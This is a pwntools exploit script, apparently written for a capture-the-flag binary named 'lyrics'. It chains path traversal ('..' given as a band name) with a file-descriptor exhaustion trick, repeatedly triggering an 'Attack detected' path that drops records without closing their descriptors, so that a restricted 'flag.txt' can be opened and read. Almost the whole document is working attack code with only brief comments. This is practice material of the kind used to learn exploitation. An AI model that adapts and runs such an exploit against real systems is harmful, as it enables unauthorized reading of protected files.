
from pwn import *

def r_cmd():
    p.recvuntil(b"> ")

def list_bands():
    r_cmd()
    p.sendline(b"bands")
    p.recvuntil("Command")

def list_songs(dir_name=b'..'):
    r_cmd()
    p.sendline(b"songs")
    p.sendlineafter(b"Band:", dir_name)
    p.recvuntil(b"Command")


def open_lyrics(dir_name=b"..", file_name="test"):
    r_cmd()
    p.sendline(b"open")
    p.sendlineafter(b"Band:", dir_name)
    p.sendlineafter(b"Song:", file_name)   
    recv_line = p.recvline()
    log.info(f"open {file_name}")
    log.info(recv_line)

    response = p.recvuntil(b"Command")
    log.info(response)

def read_lyrics(id="0"):
    r_cmd()
    p.sendline(b"read")
    p.sendlineafter(b"Record ID:", id)
    lyrics = p.recvuntil(b"Command")
    log.info(lyrics)
    return lyrics


def write_lyrics(id="0", length="2", data=b"AA"):
    r_cmd()
    p.sendline(b"write")
    p.sendlineafter(b"Record ID:", id)
    p.sendlineafter(b"Data length:", length)
    p.sendafter(b"Data:", data)
    p.recvline()
    p.recvuntil(b"Command")


def close_record():
    r_cmd()
    p.sendline(b"close")


def read(id):

    while(1):
        r_cmd()
        p.sendline(b"read")
        p.sendlineafter(b"Record ID:", str(id))
        response = p.recvuntil(b"Command")

        #print(response)

        if b"Attack detected" in response:
            log.info(f"closed {id}")
            break


p = process("./lyrics")
#context.log_level='debug'

list_bands()
list_songs()

# globals::records.size max value is 16
# so open "lyrics" 16 times b
for i in range(16):
    open_lyrics("..", "lyrics")

# this will remove 13 file descriptor without closing them
for i in range(13, 0, -1):
    read(i)

# now we already have 16+3 (stdin, stdout, stderr) open
# max allowed FD is 32 
# now open 12 more so that we have 31 FD open
for i in range(12):
    open_lyrics("Metallica", "Battery")

# 32nd FD should be flag
open_lyrics("..", "flag.txt")


# read till end of the file. THe battery has 55 lines.
for i in range(55):
    lyrics = read_lyrics(b"8")

# read flag
read_lyrics(b"15")

# read the EOF file. This should print flag.
read_lyrics(b"8")

